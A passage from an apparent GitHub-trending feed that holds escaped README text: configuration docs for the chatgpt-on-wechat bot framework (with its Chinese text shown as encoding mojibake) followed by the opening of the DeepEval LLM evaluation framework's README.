  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;4.0Ultra„ÄÅgeneralv3.5„ÄÅmax-32k„ÄÅgeneralv3„ÄÅpro-128k„ÄÅlite&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: ËÆØÈ£ûÊòüÁÅ´Âπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: ËÆØÈ£ûÊòüÁÅ´Âπ≥Âè∞ÁöÑ&lt;a href="https://console.xfyun.cn/services/bm3"&gt;APIPassword&lt;/a&gt; ÔºåÂõ†Ê®°ÂûãËÄåÂ∑≤&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ModelScope&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "modelscope",
  "model": "Qwen/QwQ-32B",
  "modelscope_api_key": "your_api_key",
  "modelscope_base_url": "https://api-inference.modelscope.cn/v1/chat/completions",
  "text_to_image": "MusePublic/489_ckpt_FLUX_1"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: modelscopeÊé•Âè£Ê†ºÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèÇËÄÉ&lt;a href="https://www.modelscope.cn/models?filter=inference_type&amp;amp;page=1"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;modelscope_api_key&lt;/code&gt;: ÂèÇËÄÉ &lt;a href="https://modelscope.cn/docs/accounts/token"&gt;ÂÆòÊñπÊñáÊ°£-ËÆøÈóÆ‰ª§Áâå&lt;/a&gt; ÔºåÂú® &lt;a href="https://modelscope.cn/my/myaccesstoken"&gt;ÊéßÂà∂Âè∞&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;modelscope_base_url&lt;/code&gt;: modelscopeÂπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;text_to_image&lt;/code&gt;: ÂõæÂÉèÁîüÊàêÊ®°ÂûãÔºåÂèÇËÄÉ&lt;a href="https://www.modelscope.cn/models?filter=inference_type&amp;amp;page=1"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h2&gt;ÈÄöÈÅìËØ¥Êòé&lt;/h2&gt; 
&lt;p&gt;‰ª•‰∏ãÂØπÂèØÊé•ÂÖ•ÈÄöÈÅìÁöÑÈÖçÁΩÆÊñπÂºèËøõË°åËØ¥ÊòéÔºåÂ∫îÁî®ÈÄöÈÅì‰ª£Á†ÅÂú®È°πÁõÆÁöÑ &lt;code&gt;channel/&lt;/code&gt; ÁõÆÂΩï‰∏ã„ÄÇ&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;1. Web&lt;/summary&gt; 
 &lt;p&gt;È°πÁõÆÂêØÂä®ÂêéÈªòËÆ§ËøêË°åWebÈÄöÈÅìÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "web",
    "web_port": 9899
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;web_port&lt;/code&gt;: ÈªòËÆ§‰∏∫ 9899ÔºåÂèØÊåâÈúÄÊõ¥ÊîπÔºåÈúÄË¶ÅÊúçÂä°Âô®Èò≤ÁÅ´Â¢ôÂíåÂÆâÂÖ®ÁªÑÊîæË°åËØ•Á´ØÂè£&lt;/li&gt; 
  &lt;li&gt;Â¶ÇÊú¨Âú∞ËøêË°åÔºåÂêØÂä®ÂêéËØ∑ËÆøÈóÆ &lt;code&gt;http://localhost:9899/chat&lt;/code&gt; ÔºõÂ¶ÇÊúçÂä°Âô®ËøêË°åÔºåËØ∑ËÆøÈóÆ &lt;code&gt;http://ip:9899/chat&lt;/code&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;Ê≥®ÔºöËØ∑Â∞Ü‰∏äËø∞ url ‰∏≠ÁöÑ ip ÊàñËÄÖ port ÊõøÊç¢‰∏∫ÂÆûÈôÖÁöÑÂÄº&lt;/p&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;2. Feishu - È£û‰π¶&lt;/summary&gt; 
 &lt;p&gt;È£û‰π¶ÊîØÊåÅ‰∏§Áßç‰∫ã‰ª∂Êé•Êî∂Ê®°ÂºèÔºöWebSocket ÈïøËøûÊé•ÔºàÊé®ËçêÔºâÂíå Webhook„ÄÇ&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;ÊñπÂºè‰∏ÄÔºöWebSocket Ê®°ÂºèÔºàÊé®ËçêÔºåÊó†ÈúÄÂÖ¨ÁΩë IPÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "feishu",
    "feishu_app_id": "APP_ID",
    "feishu_app_secret": "APP_SECRET",
    "feishu_event_mode": "websocket"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;&lt;strong&gt;ÊñπÂºè‰∫åÔºöWebhook Ê®°ÂºèÔºàÈúÄË¶ÅÂÖ¨ÁΩë IPÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "feishu",
    "feishu_app_id": "APP_ID",
    "feishu_app_secret": "APP_SECRET",
    "feishu_token": "VERIFICATION_TOKEN",
    "feishu_event_mode": "webhook",
    "feishu_port": 9891
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;feishu_event_mode&lt;/code&gt;: ‰∫ã‰ª∂Êé•Êî∂Ê®°ÂºèÔºå&lt;code&gt;websocket&lt;/code&gt;ÔºàÊé®ËçêÔºâÊàñ &lt;code&gt;webhook&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;WebSocket Ê®°ÂºèÈúÄÂÆâË£Ö‰æùËµñÔºö&lt;code&gt;pip3 install lark-oapi&lt;/code&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/feishu"&gt;È£û‰π¶Êé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;3. DingTalk - ÈíâÈíâ&lt;/summary&gt; 
 &lt;p&gt;ÈíâÈíâÈúÄË¶ÅÂú®ÂºÄÊîæÂπ≥Âè∞ÂàõÂª∫Êô∫ËÉΩÊú∫Âô®‰∫∫Â∫îÁî®ÔºåÂ∞Ü‰ª•‰∏ãÈÖçÁΩÆÂ°´ÂÖ• &lt;code&gt;config.json&lt;/code&gt;Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "dingtalk",
    "dingtalk_client_id": "CLIENT_ID",
    "dingtalk_client_secret": "CLIENT_SECRET"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/dingtalk"&gt;ÈíâÈíâÊé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;4. WeCom App - ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®&lt;/summary&gt; 
 &lt;p&gt;‰ºÅ‰∏öÂæÆ‰ø°Ëá™Âª∫Â∫îÁî®Êé•ÂÖ•ÈúÄÂú®ÂêéÂè∞ÂàõÂª∫Â∫îÁî®Âπ∂ÂêØÁî®Ê∂àÊÅØÂõûË∞ÉÔºåÈÖçÁΩÆÁ§∫‰æãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "wechatcom_app",
    "wechatcom_corp_id": "CORPID",
    "wechatcomapp_token": "TOKEN",
    "wechatcomapp_port": 9898,
    "wechatcomapp_secret": "SECRET",
    "wechatcomapp_agent_id": "AGENTID",
    "wechatcomapp_aes_key": "AESKEY"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/wechat-com"&gt;‰ºÅÂæÆËá™Âª∫Â∫îÁî®Êé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;5. WeChat MP - ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑&lt;/summary&gt; 
 &lt;p&gt;Êú¨È°πÁõÆÊîØÊåÅËÆ¢ÈòÖÂè∑ÂíåÊúçÂä°Âè∑‰∏§ÁßçÂÖ¨‰ºóÂè∑ÔºåÈÄöËøáÊúçÂä°Âè∑Ôºà&lt;code&gt;wechatmp_service&lt;/code&gt;Ôºâ‰ΩìÈ™åÊõ¥‰Ω≥„ÄÇ&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;‰∏™‰∫∫ËÆ¢ÈòÖÂè∑ÔºàwechatmpÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "wechatmp",
    "wechatmp_token": "TOKEN",
    "wechatmp_port": 80,
    "wechatmp_app_id": "APPID",
    "wechatmp_app_secret": "APPSECRET",
    "wechatmp_aes_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;&lt;strong&gt;‰ºÅ‰∏öÊúçÂä°Âè∑Ôºàwechatmp_serviceÔºâ&lt;/strong&gt;&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "wechatmp_service",
    "wechatmp_token": "TOKEN",
    "wechatmp_port": 80,
    "wechatmp_app_id": "APPID",
    "wechatmp_app_secret": "APPSECRET",
    "wechatmp_aes_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËØ¶ÁªÜÊ≠•È™§ÂíåÂèÇÊï∞ËØ¥ÊòéÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/cow/multi-platform/wechat-mp"&gt;ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑Êé•ÂÖ•&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;6. Terminal - ÁªàÁ´Ø&lt;/summary&gt; 
 &lt;p&gt;‰øÆÊîπ &lt;code&gt;config.json&lt;/code&gt; ‰∏≠ÁöÑ &lt;code&gt;channel_type&lt;/code&gt; Â≠óÊÆµÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "channel_type": "terminal"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;ËøêË°åÂêéÂèØÂú®ÁªàÁ´Ø‰∏éÊú∫Âô®‰∫∫ËøõË°åÂØπËØù„ÄÇ&lt;/p&gt; 
&lt;/details&gt; 
&lt;br /&gt; 
&lt;h1&gt;üîó Áõ∏ÂÖ≥È°πÁõÆ&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/zhayujie/bot-on-anything"&gt;bot-on-anything&lt;/a&gt;ÔºöËΩªÈáèÂíåÈ´òÂèØÊâ©Â±ïÁöÑÂ§ßÊ®°ÂûãÂ∫îÁî®Ê°ÜÊû∂ÔºåÊîØÊåÅÊé•ÂÖ•Slack, Telegram, Discord, GmailÁ≠âÊµ∑Â§ñÂπ≥Âè∞ÔºåÂèØ‰Ωú‰∏∫Êú¨È°πÁõÆÁöÑË°•ÂÖÖ‰ΩøÁî®„ÄÇ&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/MinimalFuture/AgentMesh"&gt;AgentMesh&lt;/a&gt;ÔºöÂºÄÊ∫êÁöÑÂ§öÊô∫ËÉΩ‰Ωì(Multi-Agent)Ê°ÜÊû∂ÔºåÂèØ‰ª•ÈÄöËøáÂ§öÊô∫ËÉΩ‰ΩìÂõ¢ÈòüÁöÑÂçèÂêåÊù•Ëß£ÂÜ≥Â§çÊùÇÈóÆÈ¢ò„ÄÇÊú¨È°πÁõÆÂü∫‰∫éËØ•Ê°ÜÊû∂ÂÆûÁé∞‰∫Ü&lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/plugins/agent/README.md"&gt;AgentÊèí‰ª∂&lt;/a&gt;ÔºåÂèØËÆøÈóÆÁªàÁ´Ø„ÄÅÊµèËßàÂô®„ÄÅÊñá‰ª∂Á≥ªÁªü„ÄÅÊêúÁ¥¢ÂºïÊìé Á≠âÂêÑÁ±ªÂ∑•ÂÖ∑ÔºåÂπ∂ÂÆûÁé∞‰∫ÜÂ§öÊô∫ËÉΩ‰ΩìÂçèÂêå„ÄÇ&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;üîé Â∏∏ËßÅÈóÆÈ¢ò&lt;/h1&gt; 
&lt;p&gt;FAQsÔºö &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/wiki/FAQs"&gt;https://github.com/zhayujie/chatgpt-on-wechat/wiki/FAQs&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;ÊàñÁõ¥Êé•Âú®Á∫øÂí®ËØ¢ &lt;a href="https://link-ai.tech/app/Kv2fXJcH"&gt;È°πÁõÆÂ∞èÂä©Êâã&lt;/a&gt; (Áü•ËØÜÂ∫ìÊåÅÁª≠ÂÆåÂñÑ‰∏≠ÔºåÂõûÂ§ç‰æõÂèÇËÄÉ)&lt;/p&gt; 
&lt;h1&gt;üõ†Ô∏è ÂºÄÂèë&lt;/h1&gt; 
&lt;p&gt;Ê¨¢ËøéÊé•ÂÖ•Êõ¥Â§öÂ∫îÁî®ÈÄöÈÅìÔºåÂèÇËÄÉ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/channel/feishu/feishu_channel.py"&gt;È£û‰π¶ÈÄöÈÅì&lt;/a&gt; Êñ∞Â¢ûËá™ÂÆö‰πâÈÄöÈÅìÔºåÂÆûÁé∞Êé•Êî∂ÂíåÂèëÈÄÅÊ∂àÊÅØÈÄªËæëÂç≥ÂèØÂÆåÊàêÊé•ÂÖ•„ÄÇ ÂêåÊó∂Ê¨¢ËøéË¥°ÁåÆÊñ∞ÁöÑSkillsÔºåÂèÇËÄÉ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/skills/skill-creator/SKILL.md"&gt;SkillÂàõÈÄ†Âô®ËØ¥Êòé&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;h1&gt;‚úâ ËÅîÁ≥ª&lt;/h1&gt; 
&lt;p&gt;Ê¨¢ËøéÊèê‰∫§PR„ÄÅIssuesËøõË°åÂèçÈ¶àÔºå‰ª•ÂèäÈÄöËøá üåüStar ÊîØÊåÅÂπ∂ÂÖ≥Ê≥®È°πÁõÆÊõ¥Êñ∞„ÄÇÈ°πÁõÆËøêË°åÈÅáÂà∞ÈóÆÈ¢òÂèØ‰ª•Êü•Áúã &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/wiki/FAQs"&gt;Â∏∏ËßÅÈóÆÈ¢òÂàóË°®&lt;/a&gt; Ôºå‰ª•ÂèäÂâçÂæÄ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/issues"&gt;Issues&lt;/a&gt; ‰∏≠ÊêúÁ¥¢„ÄÇ‰∏™‰∫∫ÂºÄÂèëËÄÖÂèØÂä†ÂÖ•ÂºÄÊ∫ê‰∫§ÊµÅÁæ§ÂèÇ‰∏éÊõ¥Â§öËÆ®ËÆ∫Ôºå‰ºÅ‰∏öÁî®Êà∑ÂèØËÅîÁ≥ª&lt;a href="https://cdn.link-ai.tech/portal/linkai-customer-service.png"&gt;‰∫ßÂìÅÂÆ¢Êúç&lt;/a&gt;Âí®ËØ¢„ÄÇ&lt;/p&gt; 
&lt;h1&gt;üåü Ë¥°ÁåÆËÄÖ&lt;/h1&gt; 
&lt;p&gt;&lt;img src="https://contrib.rocks/image?repo=zhayujie/chatgpt-on-wechat&amp;amp;max=1000" alt="cow contributors" /&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>confident-ai/deepeval</title>
      <link>https://github.com/confident-ai/deepeval</link>
      <description>&lt;p&gt;The LLM Evaluation Framework&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://github.com/confident-ai/deepeval/raw/main/docs/static/img/deepeval.png" alt="DeepEval Logo" width="100%" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;/p&gt;
&lt;h1 align="center"&gt;The LLM Evaluation Framework&lt;/h1&gt; 
&lt;p&gt;&lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://trendshift.io/repositories/5917" target="_blank"&gt;&lt;img src="https://trendshift.io/api/badge/repositories/5917" alt="confident-ai%2Fdeepeval | Trendshift" style="width: 250px; height: 55px;" width="250" height="55" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://discord.gg/3SEyvpgu2f"&gt; &lt;img alt="discord-invite" src="https://dcbadge.vercel.app/api/server/3SEyvpgu2f?style=flat" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h4 align="center"&gt; &lt;p&gt; &lt;a href="https://deepeval.com/docs/getting-started?utm_source=GitHub"&gt;Documentation&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/confident-ai/deepeval/main/#-metrics-and-features"&gt;Metrics and Features&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/confident-ai/deepeval/main/#-quickstart"&gt;Getting Started&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/confident-ai/deepeval/main/#-integrations"&gt;Integrations&lt;/a&gt; | &lt;a href="https://confident-ai.com?utm_source=GitHub"&gt;DeepEval Platform&lt;/a&gt; &lt;/p&gt;&lt;p&gt; &lt;/p&gt;&lt;/h4&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/confident-ai/deepeval/releases"&gt; &lt;img alt="GitHub release" src="https://img.shields.io/github/release/confident-ai/deepeval.svg?color=violet" /&gt; &lt;/a&gt; &lt;a href="https://colab.research.google.com/drive/1PPxYEBa6eu__LquGoFFJZkhYgWVYE6kh?usp=sharing"&gt; &lt;img alt="Try Quickstart in Colab" src="https://colab.research.google.com/assets/colab-badge.svg?sanitize=true" /&gt; &lt;/a&gt; &lt;a href="https://github.com/confident-ai/deepeval/raw/master/LICENSE.md"&gt; &lt;img alt="License" src="https://img.shields.io/github/license/confident-ai/deepeval.svg?color=yellow" /&gt; &lt;/a&gt; &lt;a href="https://x.com/deepeval"&gt; &lt;img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/deepeval?style=social&amp;amp;logo=x" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p align="center"&gt; 
 &lt;!-- Keep these links. Translations will automatically update with the README. --&gt; &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=de"&gt;Deutsch&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=es"&gt;Espa√±ol&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=fr"&gt;fran√ßais&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=ja"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=ko"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=pt"&gt;Portugu√™s&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=ru"&gt;–†—É—Å—Å–∫–∏–π&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/confident-ai/deepeval?lang=zh"&gt;‰∏≠Êñá&lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;DeepEval&lt;/strong&gt; is a simple-to-use, open-source LLM evaluation framework, for evaluating and testing large-language model systems. It is similar to Pytest but specialized for unit testing LLM outputs. DeepEval incorporates the latest research to evaluate LLM outputs based on metrics such as G-Eval, task completion, answer relevancy, hallucination, etc., which uses LLM-as-a-judge and other NLP models that run &lt;strong&gt;locally on your machine&lt;/strong&gt; for evaluation.&lt;/p&gt; 
&lt;p&gt;Whether your LLM applications are AI agents, RAG pipelines, or chatbots, implemented via LangChain or OpenAI, DeepEval has you covered. With it, you can easily determine the optimal models, prompts, and architecture to improve your RAG pipeline, agentic workflows, prevent prompt drifting, or even transition from OpenAI to hosting your own Deepseek R1 with confidence.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] Need a place for your DeepEval testing data to live üè°‚ù§Ô∏è? &lt;a href="https://confident-ai.com?utm_source=GitHub"&gt;Sign up to the DeepEval platform&lt;/a&gt; to compare iterations of your LLM app, generate &amp;amp; share testing reports, and more.&lt;/p&gt; 
 &lt;p&gt;&lt;img src="https://raw.githubusercontent.com/confident-ai/deepeval/main/assets/demo.gif" alt="Demo GIF" /&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Want to talk LLM evaluation, need help picking metrics, or just to say hi? &lt;a href="https://discord.com/invite/3SEyvpgu2f"&gt;Come join our discord.&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;br /&gt; 
&lt;h1&gt;üî• Metrics and Features&lt;/h1&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;ü•≥ You can now share DeepEval's test results on the cloud directly on &lt;a href="https://confident-ai.com?utm_source=GitHub"&gt;Confident AI&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ul&gt; 
 &lt;li&gt;Supports both end-to-end and component-level LLM evaluation.&lt;/li&gt; 
 &lt;li&gt;Large variety of ready-to-use LLM evaluation metrics (all with explanations) powered by &lt;strong&gt;ANY&lt;/strong&gt; LLM of your choice, statistical methods, or NLP models that run &lt;strong&gt;locally on your machine&lt;/strong&gt;: 
  &lt;ul&gt; 
   &lt;li&gt;G-Eval&lt;/li&gt; 
   &lt;li&gt;DAG (&lt;a href="https://deepeval.com/docs/metrics-dag"&gt;deep acyclic graph&lt;/a&gt;)&lt;/li&gt; 
   &lt;li&gt;&lt;strong&gt;RAG metrics:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Answer Relevancy&lt;/li&gt; 
     &lt;li&gt;Faithfulness&lt;/li&gt; 
     &lt;li&gt;Contextual Recall&lt;/li&gt; 
     &lt;li&gt;Contextual Precision&lt;/li&gt; 
     &lt;li&gt;Contextual Relevancy&lt;/li&gt; 
     &lt;li&gt;RAGAS&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;strong&gt;Agentic metrics:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Task Completion&lt;/li&gt; 
     &lt;li&gt;Tool Correctness&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;strong&gt;Others:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Hallucination&lt;/li&gt; 
     &lt;li&gt;Summarization&lt;/li&gt; 
     &lt;li&gt;Bias&lt;/li&gt; 
     &lt;li&gt;Toxicity&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;strong&gt;Conversational metrics:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Knowledge Retention&lt;/li&gt; 
     &lt;li&gt;Conversation Completeness&lt;/li&gt; 
     &lt;li&gt;Conversation Relevancy&lt;/li&gt; 
     &lt;li&gt;Role Adherence&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;etc.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Build your own custom metrics that are automatically integrated with DeepEval's ecosystem.&lt;/li&gt; 
 &lt;li&gt;Generate synthetic datasets for evaluation.&lt;/li&gt; 
 &lt;li&gt;Integrates seamlessly with &lt;strong&gt;ANY&lt;/strong&gt; CI/CD environment.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://deepeval.com/docs/red-teaming-introduction"&gt;Red team your LLM application&lt;/a&gt; for 40+ safety vulnerabilities in a few lines of code, including: 
  &lt;ul&gt; 
   &lt;li&gt;Toxicity&lt;/li&gt; 
   &lt;li&gt;Bias&lt;/li&gt; 
   &lt;li&gt;SQL Injection&lt;/li&gt; 
   &lt;li&gt;etc., using advanced 10+ attack enhancement strategies such as prompt injections.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Easily benchmark &lt;strong&gt;ANY&lt;/strong&gt; LLM on popular LLM benchmarks in &lt;a href="https://deepeval.com/docs/benchmarks-introduction?utm_source=GitHub"&gt;under 10 lines of code.&lt;/a&gt;, which includes: 
  &lt;ul&gt; 
   &lt;li&gt;MMLU&lt;/li&gt; 
   &lt;li&gt;HellaSwag&lt;/li&gt; 
   &lt;li&gt;DROP&lt;/li&gt; 
   &lt;li&gt;BIG-Bench Hard&lt;/li&gt; 
   &lt;li&gt;TruthfulQA&lt;/li&gt; 
   &lt;li&gt;HumanEval&lt;/li&gt; 
   &lt;li&gt;GSM8K&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://confident-ai.com?utm_source=GitHub"&gt;100% integrated with Confident AI&lt;/a&gt; for the full evaluation &amp;amp; observability lifecycle: 
  &lt;ul&gt; 
   &lt;li&gt;Curate/annotate evaluation datasets on the cloud&lt;/li&gt; 
   &lt;li&gt;Benchmark LLM app using dataset, and compare with previous iterations to experiment which models/prompts works best&lt;/li&gt; 
   &lt;li&gt;Fine-tune metrics for custom results&lt;/li&gt; 
   &lt;li&gt;Debug evaluation results via LLM traces&lt;/li&gt; 
   &lt;li&gt;Monitor &amp;amp; evaluate LLM responses in product to improve datasets with real-world data&lt;/li&gt; 
   &lt;li&gt;Repeat until perfection&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] DeepEval is available on Confident AI, an LLM evals platform for AI observability and quality. Create an account &lt;a href="https://app.confident-ai.com?utm_source=GitHub"&gt;here.&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;br /&gt; 
&lt;h1&gt;üîå Integrations&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;ü¶Ñ LlamaIndex, to &lt;a href="https://www.deepeval.com/integrations/frameworks/llamaindex?utm_source=GitHub"&gt;&lt;strong&gt;unit test RAG applications in CI/CD&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;ü§ó Hugging Face, to &lt;a href="https://www.deepeval.com/integrations/frameworks/huggingface?utm_source=GitHub"&gt;&lt;strong&gt;enable real-time evaluations during LLM fine-tuning&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;br /&gt; 
&lt;h1&gt;üöÄ QuickStart&lt;/h1&gt; 
&lt;p&gt;Let's pretend your LLM application is a RAG based customer support chatbot; here's how DeepEval can help test what you've built.&lt;/p&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;Deepeval works with &lt;strong&gt;Python&amp;gt;=3.9+&lt;/strong&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;pip install -U deepeval
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Create an account (highly recommended)&lt;/h2&gt; 
&lt;p&gt;Using the &lt;code&gt;deepeval&lt;/code&gt; platform will allow you to generate sharable testing reports on the cloud. It is free, takes no additional code to setup, and we highly recommend giving it a try.&lt;/p&gt; 
&lt;p&gt;To login, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;deepeval login
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Follow the instructions in the CLI to create an account, copy your API key, and paste it into the CLI. All test cases will automatically be logged (find more information on data privacy &lt;a href="https://deepeval.com/docs/data-privacy?utm_source=GitHub"&gt;here&lt;/a&gt;).&lt;/p&gt; 
&lt;h2&gt;Writing your first test case&lt;/h2&gt; 
&lt;p&gt;Create a test file:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;touch test_chatbot.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Open &lt;code&gt;test_chatbot.py&lt;/code&gt; and write your first test case to run an &lt;strong&gt;end-to-end&lt;/strong&gt; evaluation using DeepEval, which treats your LLM app as a black-box:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import pytest
from deepeval import assert_test
from deepeval.metrics import GEval
from deepeval.test_case import LLMTestCase, LLMTestCaseParams

